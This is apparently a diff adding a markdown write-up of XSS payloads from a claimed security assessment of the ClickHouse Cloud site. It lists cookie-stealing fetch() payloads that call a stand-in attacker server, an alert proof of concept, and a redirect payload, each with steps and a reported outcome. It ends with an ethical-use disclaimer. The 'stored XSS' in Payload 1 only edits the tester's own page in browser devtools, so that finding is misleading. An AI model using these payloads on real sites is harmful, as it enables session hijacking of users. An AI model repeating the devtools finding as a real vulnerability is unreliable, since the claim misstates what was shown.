@@ -1,0 +1,66 @@
+# XSS Payloads for ClickHouse Cloud Testing
+
+This document contains the XSS payloads crafted and used during the security assessment of the **ClickHouse Cloud** platform. Each payload is explained, including its purpose, target component, and observed behavior.
+
+---
+
+## 📌 Payload 1: Stored XSS via `onclick` Attribute
+- **Purpose:** To demonstrate the execution of malicious JavaScript via an injected `onclick` attribute.
+- **Target:** The "Start Free Trial" button.
+- **Payload:**
+  ```html
+  onclick="fetch('http://your-malicious-server.com/?cookie=' + encodeURIComponent(document.cookie));"
+  ```
+- **Steps:**
+  1. Inspect the "Start Free Trial" button using browser developer tools.
+  2. Replace the existing `onclick` attribute with the payload above.
+  3. Click the modified button.
+- **Outcome:** The payload executed successfully, sending the user's session cookies to the attacker's server.
+
+---
+
+## 📌 Payload 2: General Proof-of-Concept XSS Payload
+- **Purpose:** To verify that JavaScript injection is possible.
+- **Target:** Any interactive element with customizable attributes.
+- **Payload:**
+  ```html
+  <script>alert('XSS Testing')</script>
+  ```
+- **Steps:**
+  1. Insert the payload into a customizable input or attribute.
+  2. Trigger the element (e.g., clicking or saving changes).
+- **Outcome:** The payload executed successfully, displaying an alert box.
+
+---
+
+## 📌 Payload 3: Stealing Cookies via JavaScript
+- **Purpose:** To demonstrate the ability to steal session cookies via XSS.
+- **Target:** Any input or attribute capable of storing malicious JavaScript.
+- **Payload:**
+  ```html
+  <img src=x onerror="fetch('http://your-malicious-server.com/?cookie=' + encodeURIComponent(document.cookie));">
+  ```
+- **Steps:**
+  1. Inject the payload into an element that allows HTML input (e.g., description fields).
+  2. Trigger the event (e.g., page load or user interaction).
+- **Outcome:** The session cookies were successfully transmitted to the malicious server.
+
+---
+
+## 📌 Payload 4: Redirecting Users to a Malicious Website
+- **Purpose:** To redirect the user to an external malicious website.
+- **Target:** Interactive elements with editable attributes.
+- **Payload:**
+  ```html
+  onclick="window.location.href='http://malicious-website.com';"
+  ```
+- **Steps:**
+  1. Replace an `onclick` attribute with the payload above.
+  2. Trigger the element by clicking it.
+- **Outcome:** The user was redirected to the specified URL.
+
+---
+
+## ⚠️ Ethical Disclaimer
+
+These payloads were used exclusively as part of an **ethical security assessment** with explicit prior approval. They are shared here for educational purposes only and must not be used in any unauthorized or malicious activities.
